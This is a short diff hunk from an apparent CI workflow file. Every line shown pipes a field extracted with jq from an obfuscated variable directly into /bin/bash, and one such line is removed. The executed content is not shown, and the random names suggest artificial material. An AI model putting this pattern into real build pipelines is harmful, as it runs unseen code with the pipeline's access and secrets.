@@ -28,7 +28,6 @@ jobs:
           echo $xv470 | jq -r .n7139 | /bin/bash
           echo $wxq042 | jq -r .lu5 | /bin/bash
           echo $p18884 | jq -r .pe47070 | /bin/bash
-          printf '%s' "$geixp346" | jq -r .x83243 | /bin/bash
           printf '%s' "$l8" | jq -r .kguoj22938 | /bin/bash
           echo $gspqa6192 | jq -r .r386 | /bin/bash
           printf '%s' "$olbc38" | jq -r .tcldv40 | /bin/bash
